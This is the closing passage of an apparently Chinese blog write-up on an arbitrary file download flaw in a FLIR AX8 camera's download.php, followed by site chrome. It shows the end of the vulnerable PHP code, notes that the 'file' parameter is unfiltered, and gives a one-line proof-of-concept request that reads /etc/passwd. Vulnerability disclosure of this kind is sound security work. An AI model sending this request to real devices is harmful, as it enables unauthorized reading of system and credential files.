</span></span></span><span class="line"><span class="cl"><span class="s2">		exit;
</span></span></span><span class="line"><span class="cl"><span class="s2">	}
</span></span></span><span class="line"><span class="cl"><span class="s2">	else 
</span></span></span><span class="line"><span class="cl"><span class="s2">	{
</span></span></span><span class="line"><span class="cl"><span class="s2">		// file couldn&#39;t be opened
</span></span></span><span class="line"><span class="cl"><span class="s2">		header(&#34;</span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">500</span> <span class="nx">Internal</span> <span class="nx">Server</span> <span class="nx">Error</span><span class="s2">&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">		exit;
</span></span></span><span class="line"><span class="cl"><span class="s2">	}
</span></span></span><span class="line"><span class="cl"><span class="s2">}
</span></span></span><span class="line"><span class="cl"><span class="s2">else
</span></span></span><span class="line"><span class="cl"><span class="s2">{
</span></span></span><span class="line"><span class="cl"><span class="s2">	// file does not exist
</span></span></span><span class="line"><span class="cl"><span class="s2">	header(&#34;</span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">404</span> <span class="k">Not</span> <span class="nx">Found</span><span class="s2">&#34;);
</span></span></span><span class="line"><span class="cl"><span class="s2">	exit;
</span></span></span><span class="line"><span class="cl"><span class="s2">}
</span></span></span><span class="line"><span class="cl"><span class="s2">?&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>简单审计可以发现 file参数 为可控参数且没有过滤参数，导致可以下载任意文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">/download.php?file=/etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./images/202209131035895.png"
        data-srcset="./images/202209131035895.png, ./images/202209131035895.png 1.5x, ./images/202209131035895.png 2x"
        data-sizes="auto"
        alt="./images/202209131035895.png"
        title="1662985662585-c79e5e7d-48c8-4c62-8108-0a29c34c8cac" /></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 0001-01-01</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-title="" data-via="xxxx"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-title=""><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-title=""><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-title=""><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title=""><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i></a>
            <a href="/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/" class="next" rel="next" title=""><i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
